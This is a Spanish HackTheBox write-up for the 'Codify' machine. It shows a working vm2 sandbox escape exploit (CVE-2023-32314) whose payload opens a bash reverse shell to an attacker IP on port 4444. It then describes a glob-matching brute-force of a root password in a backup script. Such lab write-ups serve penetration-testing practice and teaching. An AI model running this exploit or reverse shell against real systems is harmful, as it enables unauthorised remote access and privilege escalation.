---
titulo: "HackTheBox – Maquina: Codify"
descripcion: "Explotación de sandbox escape en vm2, abuso de script Bash con comparación de contraseñas vulnerable a wildcard brute-force para escalar a root."
fecha: 2024-08-20
dificultad: easy
herramientas: ["nmap", "node.js", "vm2", "burpsuite", "pspy", "bash"]
categoria: htb
plataforma: HackTheBox
puntos: 20
completado: true
---

## Reconocimiento

Puerto 3000 corre una aplicación Node.js que permite ejecutar código JavaScript en un sandbox vm2.

## Explotación – vm2 Sandbox Escape

La versión de vm2 es vulnerable a **CVE-2023-32314**. El exploit permite escapar del sandbox y ejecutar comandos en el sistema:

```javascript
const { VM } = require("vm2");
const vm = new VM();
const code = `
  const err = new Error();
  err.stack = new Proxy(err.stack, {
    get: function(target, prop, receiver) {
      const cc = Reflect.get(target, prop, receiver);
      if (cc?.constructor?.name === "VMError") {
        const {require} = cc.constructor.constructor("return process")();
        const child_process = require("child_process");
        return child_process.execSync("bash -i >& /dev/tcp/10.10.14.X/4444 0>&1");
      }
    }
  });
  throw err;
`;
vm.run(code);
```

## Escalada de Privilegios

Script `/opt/scripts/mysql-backup.sh` comparaba contraseñas con `[[ "$pass" == $DB_PASS ]]` (sin comillas en la variable), susceptible a glob matching. Brute-force carácter a carácter para extraer la contraseña de root.
